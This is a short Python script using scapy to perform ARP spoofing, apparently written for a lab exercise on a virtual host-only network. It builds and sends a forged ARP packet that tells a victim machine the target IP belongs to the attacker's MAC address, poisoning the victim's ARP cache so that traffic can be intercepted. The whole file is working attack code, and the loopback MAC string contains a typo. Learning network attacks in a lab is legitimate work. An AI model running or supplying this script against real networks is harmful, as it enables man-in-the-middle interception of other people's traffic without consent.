# script for ARP spoofing
# written by Abdel K. Bokharouss and Adriaan Knapen

from scapy.all import *
import sys

vIP = '192.168.56.101'
tIP = '192.168.56.102'
vM =  '08:00:27:B0:A1:AB'

"""
Return own mac_addresss
@rtype: str
@return: mac address
"""
def get_mac_address():
    macs = [get_if_hwaddr(i) for i in get_if_list()]
    for mac in macs:
        if (mac != '00:00:00:00:00gi:00'):
            return mac
    raise Exception("Failed to obtain local mac address")

def spoofARP(own_mac, victimIP, victimMAC, targetIP):
    packet = Ether(src = own_mac) / ARP(op = "who-has", hwsrc = own_mac, hwdst = victimMAC, psrc = targetIP, pdst = victimIP)
    sendp(packet)

def main():
    try:
        attacker_mac = get_mac_address()
    except Exception as e:
        print(e)
        sys.exit(1)
    victimIP = vIP # has to be automated
    victimMAC = vM
    targetIP = tIP
    spoofARP(attacker_mac, victimIP, victimMAC, targetIP)

if __name__ == "__main__":
    main()
